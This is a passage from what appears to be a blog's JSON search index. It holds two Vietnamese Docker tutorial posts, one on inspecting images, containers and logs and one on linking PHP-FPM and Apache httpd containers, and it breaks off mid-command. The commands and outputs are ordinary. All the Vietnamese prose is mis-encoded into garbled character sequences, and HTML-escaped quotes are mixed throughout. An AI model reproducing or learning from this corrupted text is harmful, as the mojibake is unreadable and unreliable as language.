ƒë·ªçc.  docker image history D√πng ƒë·ªÉ truy v·∫•n th√¥ng tin l·ªãch s·ª≠ c√°c thao t√°c ƒë·ªÉ h√¨nh th√†nh n√™n m·ªôt image. C√∫ ph√°p:\n1  docker image history image_name\r  Khi ch·∫°y, ta ƒë∆∞·ª£c k·∫øt qu·∫£ nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ‚ùØ docker image history php:8.1.0alpha1-fpm-buster\rIMAGE CREATED CREATED BY SIZE COMMENT\r65167ddfe773 3 days ago /bin/sh -c #(nop) CMD [\u0026#34;php-fpm\u0026#34;] 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) EXPOSE 9000 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) STOPSIGNAL SIGQUIT 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; cd /usr/local/etc; if‚Ä¶ 26.6kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) WORKDIR /var/www/html 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENTRYPOINT [\u0026#34;docker-php-e‚Ä¶ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c docker-php-ext-enable sodium 17B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY multi:6dfba8f7e64bd54‚Ä¶ 6.75kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m‚Ä¶ 104MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY file:ce57c04b70896f77‚Ä¶ 587B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m‚Ä¶ 12.5MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_SHA256=131a81ef9e‚Ä¶ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_URL=https://downl‚Ä¶ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_VERSION=8.1.0alph‚Ä¶ 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV GPG_KEYS=528995BFEDFB‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_LDFLAGS=-Wl,-O1 -‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CPPFLAGS=-fstack-‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CFLAGS=-fstack-pr‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_EXTRA_CONFIGURE_A‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; mkdir -p \u0026#34;$PHP_INI_DIR‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_INI_DIR=/usr/loca‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; apt-get update; apt-g‚Ä¶ 227MB \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHPIZE_DEPS=autoconf ‚Ä¶ 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; { echo \u0026#39;Package: php‚Ä¶ 46B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;bash\u0026#34;] 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ADD file:7362e0e50f30ff454‚Ä¶ 69.3MB\r  Qua d·ªØ ki·ªán tr√™n ta bi·∫øt t·ª´ thao t√°c c∆° s·ªü ƒë√£ tr·∫£i qua nh·ªØng b∆∞·ªõc n√†o ƒë·ªÉ c√≥ th·ªÉ t·∫°o th√†nh image php\ndocker inspect L·ªánh n√†y tr·∫£ v·ªÅ th√¥ng tin c·ªßa image d∆∞·ªõi d·∫°ng JSON\n1  docker inspect image_name/id\r  L·ªánh n√†y li·ªát k√™ t·∫•t c·∫£ c√°c th√¥ng tin v·ªÅ image, v√≠ d·ª• sau ƒë√¢y l√† m·ªôt ph·∫ßn th√¥ng tin v·ªÅ c√°c l·ªõp layer c·ªßa image php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u0026#34;RootFS\u0026#34;: {\r\u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;,\r\u0026#34;Layers\u0026#34;: [\r\u0026#34;sha256:02c055ef67f5904019f43a41ea5f099996d8e7633749b6e606c400526b2c4b33\u0026#34;,\r\u0026#34;sha256:d2252dfd3726823303a8f54483e10f3ed7959f33ba63ea3a19bd0fc46587bc8f\u0026#34;,\r\u0026#34;sha256:6c63b3f282cb455ac2e456fb99cdceab42a876603b54cc97087c17b9999b780b\u0026#34;,\r\u0026#34;sha256:8e859e616115511355eadb05cbdcf86333434621f77c3ac80c410257ea39f115\u0026#34;,\r\u0026#34;sha256:363c2d4617a0df71a4d53f484a522caa9f2f02ba1271c7f7b4ceb524c5bac61a\u0026#34;,\r\u0026#34;sha256:c66c7f1f8019ed243ea38cb9ca384135cfeb3cda372de18deece786702c0c582\u0026#34;,\r\u0026#34;sha256:d87b1d289a070d7d2503bfedb8263ff5431423cd9eca8e577ce93d2e74392315\u0026#34;,\r\u0026#34;sha256:7d973749b6e2ff44d90f4df11576a27388c317f99400b746e8d8c021a747c91f\u0026#34;,\r\u0026#34;sha256:d5677f1776e8f36c5ba0cd40ff850a2e1ce919e22019bb76529ce6102c7b89ab\u0026#34;,\r\u0026#34;sha256:1cce6b181873aeb25ca52478d8f6c6b1c66213689085cc7a89e229ea045abd24\u0026#34;\r]\r},\r  B√™n c·∫°nh ƒë√≥, l·ªánh n√†y c√≤n c√≥ th·ªÉ tra c·ª©u th√¥ng tin chi ti·∫øt c·ªßa container, ch√∫ng ta ch·ªâ c·∫ßn thay t√™n/id c·ªßa image th√†nh t√™n/id c·ªßa container ƒë·ªÉ tra c·ª©u th√¥ng tin chi ti·∫øt c·ªßa container.\ndocker diff Nh∆∞ ƒë√£ n√≥i ·ªü tr√™n, m·ªôt container ƒë∆∞·ª£c sinh ra t·ª´ m·ªôt platform image, sau khi docker ch·∫°y, c√†i ƒë·∫∑t, ch·ªânh s·ª≠a, thay ƒë·ªïi c·∫•u tr√∫c b√™n trong r·ªìi commit l·∫°i th√†nh nh·ªØng layer. ƒê·ªÉ xem nh·ªØng thay ƒë·ªïi c·ªßa c·∫•u tr√∫c th∆∞ m·ª•c b√™n trong t·ª´ th·ªùi ƒëi·ªÉm t·∫°o ra ƒë·∫øn th·ªùi ƒëi·ªÉm hi·ªán t·∫°i, ta d√πng l·ªánh docker diff. C√∫ ph√°p:\n1  docker diff container_id/name\r  V√≠ d·ª•, ta ki·ªÉm tra t·ª´ l√∫c t·∫°o ra cho ƒë·∫øn th·ªùi ƒëi·ªÉm hi·ªán t·∫°i, c·∫•u tr√∫c th∆∞ m·ª•c b√™n trong container c-php ƒë√£ thay ƒë·ªïi nh∆∞ th·∫ø n√†o:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ‚ùØ docker diff c-php\rC /home\rA /home/SharedData\rC /usr\rC /usr/local\rC /usr/local/lib\rC /usr/local/lib/php\rC /usr/local/lib/php/extensions\rC /usr/local/lib/php/extensions/no-debug-non-zts-20201009\rA /usr/local/lib/php/extensions/no-debug-non-zts-20201009/mysqli.so\rA /usr/local/lib/php/extensions/no-debug-non-zts-20201009/pdo_mysql.so\rC /usr/local/etc\rC /usr/local/etc/php\rC /usr/local/etc/php/conf.d\rA /usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini\rA /usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini\rC /usr/local/include\rC /usr/local/include/php\rC /usr/local/include/php/ext\rA /usr/local/include/php/ext/mysqli\rA /usr/local/include/php/ext/mysqli/php_mysqli_structs.h\rA /usr/local/include/php/ext/mysqli/mysqli_mysqlnd.h\r  ·ªü ƒë√¢y k√≠ t∆∞ C th·ªÉ hi·ªán r·∫±ng th∆∞ m·ª•c ƒë√≥ ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t, c√≤n A l√† th∆∞ m·ª•c ƒë√≥ v·ª´a ƒë∆∞·ª£c th√™m v√†o.\ndocker log Khi container ho·∫°t ƒë·ªông, d·∫•u v·∫øt ho·∫°t ƒë·ªông c·ªßa n√≥ ƒë∆∞·ª£c ghi v√†o h·ªá th·ªëng log c·ªßa container. ƒê·ªÉ ki·ªÉm tra log c·ªßa container, ch√∫ng ta d√πng l·ªánh:\n1  docker logs container_name/id\r  V√≠ d·ª• ta ki·ªÉm tra log c·ªßa c-php xem trong qu√° tr√¨nh ho·∫°t ƒë·ªông n√≥ ƒë√£ ghi nh·ªØng g√¨:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ‚ùØ docker logs c-php\r[11-Jun-2021 07:15:23] NOTICE: fpm is running, pid 1\r[11-Jun-2021 07:15:23] NOTICE: ready to handle connections\r172.23.0.4 - 11/Jun/2021:07:16:07 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r[11-Jun-2021 07:17:34] NOTICE: Finishing ...\r[11-Jun-2021 07:17:34] NOTICE: exiting, bye-bye!\r[11-Jun-2021 07:17:35] NOTICE: fpm is running, pid 1\r[11-Jun-2021 07:17:35] NOTICE: ready to handle connections\r172.23.0.4 - 11/Jun/2021:07:17:42 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:17:48 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /index.php\u0026#34; 302\r172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:07:17:58 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:07:18:19 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:22:34 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /index.php\u0026#34; 302\r172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:07:23:32 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:07:24:31 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:26:46 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:07:36:12 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /index.php\u0026#34; 302\r172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:10:39:59 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:10:40:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:11:16:52 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r[11-Jun-2021 11:19:58] NOTICE: Finishing ...\r[11-Jun-2021 11:19:58] NOTICE: exiting, bye-bye!\r[11-Jun-2021 11:20:00] NOTICE: fpm is running, pid 1\r[11-Jun-2021 11:20:00] NOTICE: ready to handle connections\r172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302\r172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r[11-Jun-2021 11:27:42] NOTICE: Finishing ...\r[11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye!\r[14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1\r[14-Jun-2021 02:55:15] NOTICE: ready to handle connections\r  Tr∆∞·ªùng h·ª£p log qu√° d√†i, ta c√≥ th·ªÉ ch·ªâ ƒë·ªãnh s·ªë d√≤ng ki·ªÉm tra b·∫±ng c√°ch th√™m option --tail so_dong\n1 2 3 4 5 6 7 8 9 10 11  ‚ùØ docker logs --tail 10 c-php\r[11-Jun-2021 11:20:00] NOTICE: ready to handle connections\r172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302\r172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200\r172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500\r[11-Jun-2021 11:27:42] NOTICE: Finishing ...\r[11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye!\r[14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1\r[14-Jun-2021 02:55:15] NOTICE: ready to handle connections\r  ƒê·ªÉ ki·ªÉm tra log theo th·ªùi gian th·ª±c khi docker ƒëang ch·∫°y, ta th√™m t√πy ch·ªçn -f v√†o:\n1  docker logs -f container_name/id\r  docker stats Khi container ƒëang ch·∫°y, n√≥ c√≥ s·ª≠ d·ª•ng c√°c t√†i nguy√™n c·ªßa h·ªá th·ªëng, ƒë·ªÉ gi√°m s√°t m·ª©c ƒë·ªô s·ª≠ d·ª•ng t√†i nguy√™n, ta s·ª≠ d·ª•ng c√∫ ph√°p:\n1  docker stats container_name/id\r  khi d√πng\n1  docker stats\r  m·∫∑c ƒë·ªãnh, n√≥ s·∫Ω gi√°m s√°t to√†n b·ªô container ƒëang ch·∫°y tr√™n h·ªá th·ªëng\nProcess docker top 1  docker top docker_name/id\r  D√πng ƒë·ªÉ xem th√¥ng tin v·ªÅ ti·∫øn tr√¨nh (process) c·ªßa docker, bao g·ªìm PID (process Id) v√† PPID (Parent Process Id).\nCh√∫ng ta c√≤n c√≥ th·ªÉ xem th√¥ng tin v·ªÅ c√°c ti·∫øn tr√¨nh ·ªü d·∫°ng c√¢y:\n1  pstree -c -p -A $(pgrep dockerd)\r  ","description":"Tra c·ª©u th√¥ng tin Image, Container v√† gi√°m s√°t ho·∫°t ƒë·ªông container Docker","id":12,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P5)","uri":"https://minhlongmt183.github.io/posts/docker_p5/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r C√†i ƒë·∫∑t, t·∫°o v√† ch·∫°y PHP, phi√™n b·∫£n c√≥ PHP-FPM b·∫±ng Docker pull phi√™n b·∫£n image php-fpm t·ª´ docker hub Ch√∫ng ta t·∫£i b·∫£n 7.3-fpm t·ª´ docker hub. fpm ·ªü ƒë√¢y c√≥ nghƒ©a l√† trong g√≥i n√†y, c√≥ th√™m d·ªãch v·ª• php-fpm. D·ªãch v·ª• n√†y l·∫Øng nghe v√† t·∫°o ra nhi·ªÅu ti·∫øn tr√¨nh php tr√™n c·ªïng 9000 ch·ªù c√°c webserver nh∆∞ http, nginx k·∫øt n·ªëi v√†o.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ‚ùØ docker pull php:7.3-fpm\r7.3-fpm: Pulling from library/php\r69692152171a: Pull complete 2040822db325: Pull complete 9b4ca5ae9dfa: Pull complete ac1fe7c6d966: Pull complete c342d9e76a3c: Pull complete 6ead8e46ae7b: Pull complete 5c98df0d7626: Pull complete dd302d19deb7: Pull complete 7701b71427d2: Pull complete 672353cf3439: Pull complete b379e47d0c20: Pull complete Digest: sha256:d38892103d2f76e3245a080875718d74414d6d7a57cfe7000a91f4aa668f870b\rStatus: Downloaded newer image for php:7.3-fpm\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 2 days ago 170MB\rbusybox latest 69593048aa3a 2 days ago 1.24MB\rphp 7.3-fpm 2692864592ed 4 weeks ago 399MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  T·∫°o m·∫°ng bridge ƒê·∫ßu ti√™n ch√∫ng ta t·∫°o m·ªôt bride network c√≥ t√™n l√† www-net\n1 2 3 4 5 6 7 8  ‚ùØ docker network create --driver bridge www-net\r4d9c8d81da85fd9118cea666265aab88ae6ab71ac1d53a2dd81b168d87c9d290\r‚ùØ docker network ls\rNETWORK ID NAME DRIVER SCOPE\r286d5161c9f6 bridge bridge local\r0f2ab02aa9f4 host host local\r271997adaaa9 none null local\r4d9c8d81da85 www-net bridge local\r  T·∫°o th∆∞ m·ª•c chia s·∫ª d·ªØ li·ªáu gi·ªØa m√°y host v√† container Tr√™n m√°y host, ta x√¢y d·ª±ng m·ªôt c√¢y th∆∞ m·ª•c ƒë·ªÉ l∆∞u tr·ªØ d·ªØ li·ªáu chia s·∫ª v·ªõi container nh∆∞ sau:\n1 2 3 4 5 6 7  .\r‚îú‚îÄ‚îÄ docker\r‚îÇ¬†‚îî‚îÄ‚îÄ data\r‚îÇ¬†‚îú‚îÄ‚îÄ c1.txt\r‚îÇ¬†‚îú‚îÄ‚îÄ data_container2.txt\r‚îÇ¬†‚îú‚îÄ‚îÄ d.txt\r‚îÇ¬†‚îî‚îÄ‚îÄ www\r  V·ªÅ ki·∫øn th·ª©c li√™n quan v·ªÅ chia s·∫ª d·ªØ li·ªáu gi·ªØa m√°y host v√† container, b·∫°n c√≥ th·ªÉ xem kƒ© h∆°n ·ªü ph·∫ßn 2\nCh·∫°y container php-fpm Ch√∫ng ta t·∫°o m·ªôt container c√≥ t√™n l√† c-php\n1 2 3 4 5  ‚ùØ docker run -d --name c-php -v /home/edisc/Desktop/docker/data:/home/SharedData --network www-net php:7.3-fpm\r2894c033c93f5e4f2b02198afbb94cc9b5e62467b2e4c1291a7c2444f30659a7\r‚ùØ docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r2894c033c93f php:7.3-fpm \u0026#34;docker-php-entrypoi‚Ä¶\u0026#34; 2 minutes ago Up 2 minutes 9000/tcp c-php\r  ·ªû ƒë√¢y, v√¨ sau khi t·∫°o ch√∫ng ta kh√¥ng mu·ªën v√†o tr·ª±c ti·ªáp docker n√™n kh√¥ng d√πng t√πy ch·ªçn -it, tuy nhi√™n th√™m l·ªánh -d ƒë·ªÉ sau khi t·∫°o docker ti·∫øp t·ª•c ch·∫°y n·ªÅn. ·ªé ƒë√¢y, t√¥i d√πng linux n√™n qu√° tr√¨nh di·ªÖn ra kh√° thu·∫≠n l·ª£i, nh∆∞ng theo t√°c gi·∫£ th√¨ n·∫øu b·∫°n d√πng Windows hay MacOs th√¨ c·∫ßn ph·∫£i thi·∫øt l·∫≠p th∆∞ m·ª•c ·ªü ch·∫ø ƒë·ªô share v·ªõi docker th√¨ m·ªõi c√≥ th·ªÉ t·∫°o ƒë∆∞·ª£c. Chi ti·∫øt b·∫°n c√≥ th·ªÉ v√†o k√™nh c·ªßa anh XuanThuLabChanel ƒë·ªÉ xem r√µ h∆°n. B√™n c·∫°nh ƒë√≥, ta c≈©ng th·∫•y container m·ªõi ƒë∆∞·ª£c t·∫°o n√†y ch·∫°y ƒëang ch·∫°y l·ªánh \u0026ldquo;docker-php-entrypoi‚Ä¶\u0026quot;, b·∫£n ch·∫•t l·ªánh n√†y d√πng ƒë·ªÉ g·ªçi d·ªãch v·ª• php-fpm ƒë·ªÉ ch·∫°y v√† l·∫Øng nghe ·ªü c·ªïng 9000.\nKi·ªÉm tra php Ch√∫ng ta v√†o container v·ª´a m·ªõi t·∫°o, √¥n l·∫°i ki·∫øn th·ª©c c≈©, thay v√¨ v√†o container b·∫±ng l·ªánh docker attach ta c√≤n c√≥ m·ªôt c√°ch kh√°c ƒë√≥ l√† th·ª±c thi c√¢u l·ªánh bash trong container t·ª´ host th√¥ng qua docker exec\n1 2  ‚ùØ docker exec -it c-php bash\rroot@2894c033c93f:/var/www/html#   Ta v√†o th∆∞ m·ª•c chia s·∫ª /home/SharedData/ ƒë·ªÉ ki·ªÉm tra d·ªØ li·ªáu tr√™n th∆∞ m·ª•c\n1 2 3 4  root@2894c033c93f:/var/www/html# cd /home/SharedData/\rroot@2894c033c93f:/home/SharedData# ls\rc1.txt\td.txt data_container2.txt www\rroot@2894c033c93f:/home/SharedData#   Tr√™n m√°y host, ta t·∫°o file test.php trong th∆∞ m·ª•c www v√† d·ªÖ th·∫•y n√≥ c≈©ng hi·ªán ·ªü trong container.\nTi·∫øn h√†nh ch·∫°y l·ªánh file test.php:\nTa ƒë√£ ch·∫°y ƒë∆∞·ª£c php, php tr√™n container l√† phi√™n b·∫£n PHP 7.3.28\n1 2 3 4  root@2894c033c93f:/home/SharedData/www# php --version\rPHP 7.3.28 (cli) (built: May 12 2021 13:46:47) ( NTS )\rCopyright (c) 1997-2018 The PHP Group\rZend Engine v3.3.28, Copyright (c) 1998-2018 Zend Technologies\r  C√†i ƒë·∫∑t, ch·∫°y Apache HTTPD b·∫±ng Docker T·∫£i image Apache httpd Ch√∫ng ta ƒë√£ c√†i conatiner c-php, ti·∫øp theo c√†i m√°y ch·ªß httpd. Ch√∫ng ta t·∫£i image httpd phi√™n b·∫£n m·ªõi nh·∫•t v·ªÅ v·ªõi c√¢u l·ªánh quen thu·ªôc:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ‚ùØ docker pull httpd\rUsing default tag: latest\rlatest: Pulling from library/httpd\r69692152171a: Already exists 7284b4e0cc7b: Pull complete 3678b2d55ccd: Pull complete aeb67982a725: Pull complete 06954f8169fd: Pull complete Digest: sha256:48bae0ac5d0d75168f1c1282c0eb21b43302cb1b5c5dc9fa3b4a758ccfb36fe9\rStatus: Downloaded newer image for httpd:latest\r‚ùØ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnewimage version2 a8e04dcf8737 2 days ago 170MB\rbusybox latest 69593048aa3a 2 days ago 1.24MB\rhttpd latest 39c2d1c93266 2 weeks ago 138MB\rphp 7.3-fpm 2692864592ed 4 weeks ago 399MB\rubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB\rcentos latest 300e315adb2f 6 months ago 209MB\r  L·∫•y c·∫•u h√¨nh httpd.conf Khi htppd ch·∫°y, n√≥ s·∫Ω n·∫°p file c·∫•u h√¨nh trong ƒë∆∞·ªùng d·∫´n ·ªü container: /usr/local/apache2/conf/httpd.conf. Do ƒë√≥, ƒë√¢y c≈©ng l√† n∆°i ƒë·ªÉ ch√∫ng ta mu·ªën c·∫•u h√¨nh t√πy ch·ªânh theo √Ω mu·ªën c·ªßa m√¨nh.\nƒê·∫ßu ti√™n, ta s·∫Ω ch·∫°y t·∫°m th·ªùi container httpd ƒë·ªÉ tr√≠ch xu·∫•t file c·∫•u h√¨nh httpd.conf ra m√°y host tr∆∞·ªõc.\n1  ‚ùØ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData httpd cp /usr/local/apache2/conf/httpd.conf /home/SharedData/\r  V√¨ ch√∫ng ta ch·∫°y container n√†y m·ªôt l·∫ßn ƒë·ªÉ tr√≠ch xu·∫•t file httpd.conf n√™n ta th√™m t√πy ch·ªçn --rm ƒë·ªÉ docker s·∫Ω t·ª± ƒë·ªông x√≥a sau khi ch·∫°y, b√™n c·∫°nh ƒë√≥, khi ch·∫°y container ta c≈©ng th·ª±c hi·ªán lu√¥n c√¢u l·ªánh copy file httpd.conf ƒë·∫øn th∆∞ m·ª•c chia s·∫ª d·ªØ li·ªáu c·ªßa m√¨nh. Sau khi ch·∫°y l·ªánh tr√™n, ch√∫ng ta ƒë√£ c√≥ file httpd.conf tr√™n th∆∞ m·ª•c data ·ªü host.\n1 2  ‚ùØ ls\rc1.txt data_container2.txt d.txt httpd.conf www\r  C·∫•u h√¨nh httpd.conf Sau khi c√≥ ƒë∆∞·ª£c file httpd.conf, ta m·ªü ra v√† ti·∫øn h√†nh c·∫•u h√¨nh.\nM√°y ch·ªß apache ƒë∆∞·ª£c t·∫°o ra s·∫Ω t·∫°o nh·ªØng file php th√¥ng qua proxy, t·ª©c l√† khi ta truy v·∫•n ƒë·∫øn nh·ªØng file c√≥ ph·∫ßn m·ªü r·ªông l√† .php apache s·∫Ω y√™u c·∫ßu server ch·∫°y php-fpm ƒë·ªÉ thi h√†nh file php ƒë√≥. ƒê·ªÉ s·ª≠ d·ª•ng proxy cho apache, ta c·∫ßn ph·∫£i n·∫°p c√°c module v·ªÅ proxy c·ª• th·ªÉ :\nB·∫≠t m·ªôt s·ªë module sau trong file httpd.conf:  module mod_proxy.so v√† mod_proxy_fcgi.so\n  Th√™m AddHandler Th√™m AddHandler ƒë·ªÉ ch·ªâ th·ªã apache ch·∫°y php th√¥ng qua proxy. Ta th√™m d√≤ng l·ªánh sau v√†o cu·ªëi file:\n1  AddHandler \u0026#34;proxy:fcgi://ip:9000\u0026#34; .php\r  tr∆∞·ªùng h·ª£p n√†y, ta truy v·∫•n ƒë·ªÉ container c-php n√™n ·ªü ip ta thay th√†nh c-php v√† c·ªïng v·∫´n l√† 9000\nThi·∫øt l·∫≠p th∆∞ m·ª•c m·∫∑c ƒë·ªãnh c·ªßa apache ƒê·ªÉ thi·∫øt l·∫≠p th∆∞ m·ª•c m·∫∑c ƒë·ªãnh khi ch√∫ng ta share, ch√∫ng ta s·∫Ω thay ƒë·ªïi ·ªü\n1 2  DocumentRoot \u0026#34;/usr/local/apache2/htdocs\u0026#34;\r\u0026lt;Directory \u0026#34;/usr/local/apache2/htdocs\u0026#34;\u0026gt;\r  Thay ƒë·ªïi th√†nh th∆∞ m·ª•c m√† ch√∫ng ta mu·ªën mount v√†o.\nCh·∫°y m√°y ch·ªß Http Apache Ta ch·∫°y c√¢u l·ªánh:\n1  docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd\r  ·ªû ƒë√¢y:\n Ta ch·∫°y m·ªôt container c√≥ t√™n l√† c-httpd v·ªõi hostname l√† httpd k·∫øt n·ªëi m·∫°ng www-net. √Ånh x·∫° c·ªïng 80, 443 c·ªßa container l·∫ßn l∆∞·ª£t l√™n c·ªïng 9999, 443 c·ªßa m√°y host. Th∆∞ m·ª•c chia s·∫ª d·ªØ li·ªáu /home/edisc/Desktop/docker/data tr√™n m√°y host ƒë∆∞·ª£c √°nh x·∫° l√™n /home/SharedData tr√™n container, v√† file c·∫•u h√¨nh httpd.conf c≈©ng ƒë∆∞·ª£c √°nh x·∫° v√†o /usr/local/apache2/conf/httpd.conf.\n·ªû ƒë√¢y l∆∞u √Ω, kh·∫£ nƒÉng ch√∫ng ta s·∫Ω b·ªã l·ªói  1 2  docker: Error response from daemon: driver failed programming external connectivity on endpoint c-httpd (e0fa76873fc8a5b1b73a0e9589774a25d7a7c377a777d3af6c5313bf7c44adc7): Error starting userland proxy: listen tcp 0.0.0.0:443: bind: address already in use.\rERRO[0000] error waiting for container: context canceled   T·ª©c l√† c·ªïng m√† ch√∫ng ta √°nh x·∫° tr√™n m√°y host ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi m·ªôt ti·∫øn tr√¨nh n√†o ƒë√≥. L√∫c b√¢y gi·ªù c√≥ 2 c√°ch gi·∫£i quy·∫øt:\n Ch·ªçn c·ªïng kh√°c tr√™n m√°y host T√¨m c√°c ·ª©ng d·ª•ng s·ª≠ d·ª•ng c·ªïng n√†y r·ªìi kill n√≥ ƒëi. ƒê·ªÉ t√¨m c√°c c·ªïng s·ª≠ d·ª•ng ta d√πng l·ªánh sudo netstat -pna | grep 443 v·ªõi 443 l√† port m√¨nh c·∫ßn t√¨m.\nTa ƒë∆∞·ª£c k·∫øt qu·∫£.  1 2 3 4 5 6 7  ‚ùØ docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v 